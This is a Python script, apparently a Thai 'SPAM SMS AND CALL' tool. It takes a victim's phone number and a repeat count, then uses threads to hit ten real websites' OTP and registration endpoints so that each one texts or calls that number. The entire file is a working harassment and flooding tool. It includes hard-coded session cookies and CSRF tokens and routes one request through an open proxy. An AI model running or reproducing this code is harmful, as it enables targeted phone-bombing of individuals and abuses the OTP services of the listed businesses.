import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
clear()
print  ('''
  \33[33m 
  \33[33m   ███████╗██████╗  █████╗ ███╗   ███╗   ███████╗███╗   ███╗███████╗     ██████╗ █████╗ ██╗     ██╗     
  \33[33m   ██╔════╝██╔══██╗██╔══██╗████╗ ████║   ██╔════╝████╗ ████║██╔════╝    ██╔════╝██╔══██╗██║     ██║     
  \33[33m   ███████╗██████╔╝███████║██╔████╔██║   ███████╗██╔████╔██║███████╗    ██║     ███████║██║     ██║     
  \33[33m   ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║   ╚════██║██║╚██╔╝██║╚════██║    ██║     ██╔══██║██║     ██║     
  \33[33m   ███████║██║     ██║  ██║██║ ╚═╝ ██║   ███████║██║ ╚═╝ ██║███████║    ╚██████╗██║  ██║███████╗███████╗
  \33[33m   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝   ╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ \33[91m  V.1.0  \33[33m
''')
print("")
print("\033[0m________________________________________________________________")
print("")
print("\033[1;96m               [+] FACEBOOK : SAKOL THANEERAT") 
print("")
print("\033[1;96m               [+] YOUTUBE : CYBER-SAFE ")
print("")
print("\033[1;96m               [+] FACEBOOK : CYBER-SAFE")
print("")
print("\033[1;96m               [+] SPAM SMS AND CALL : 10 API")
print("")
print("\033[0m________________________________________________________________")
print("")
phone = input("\033[1;91m[!] | Enter the PhoneNumber : \033[1;96m")
NUM = int(input("\033[1;91m[!] | Enter of Number Attack : \033[1;96m"))
print("")
time.sleep(1)
print("\033[1;92m working.... ")
time.sleep(3.50)
# os.system("clear")
print(f"\033[1;91mเบอร์ : {phone}")
print(f"\033[1;91mจำนวน : {NUM}")
print("")
print("\033[1;91m------------------------💣กำลังทำงาน 💣------------------------")
print("")
print("\033[1;90m[\033[1;95mกำลังทำงาน✅\033[1;90m]")

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

def api1():
    requests.post("https://bkgame.bet/env/authen.php?requestotp", data=f"phone_number={phone}",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

def api2():
    requests.get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()

def api3():
    requests.post("https://www.homepro.co.th/service/user/profile/otp.jsp",data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"}).json()

def api4():
	requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
    
def api5():
  requests.post("https://www.fox888.com/api/otp/register", data = "applicant="+phone+"&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})

def api6():
	requests.post("https://ufa3bb.com/account/register/sendotp", data=f"phone={phone}",headers={
	"x-requested-with": "XMLHttpRequest",
	"accept": "application/json, text/javascript, /; q=0.01",
	"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	"referer": "https://ufa3bb.com/account/register",
	"cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"})

def api7():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})

def api8():
    requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number={phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")


def api9():
	requests.post("https://referral.huaydee.com/v1/sendotp", data={"phone:phone"})#//กาก
	
def api10():
	requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
	
for i in range(NUM):
    # time.sleep(0.5)
    threading.Thread(target=api1).start()
    print("\033[1;92mDone !API-1!")
    threading.Thread(target=api2).start()
    print("\033[1;92mDone !API-2!")
    threading.Thread(target=api3).start()
    print("\033[1;92mDone !API-3!")
    threading.Thread(target=api4).start()
    print("\033[1;92mDone !API-4!")
    threading.Thread(target=api5).start()
    print("\033[1;92mDone !API-5!")
    threading.Thread(target=api6).start()
    print("\033[1;92mDone !API-6!")
    threading.Thread(target=api7).start()
    print("\033[1;92mDone !API-7!")
    threading.Thread(target=api8).start()
    print("\033[1;92mDone !API-8!")
    threading.Thread(target=api9).start()
    print("\033[1;92mDone !API-9!")
    threading.Thread(target=api10).start()
    print("\033[1;92mDone !API-10!")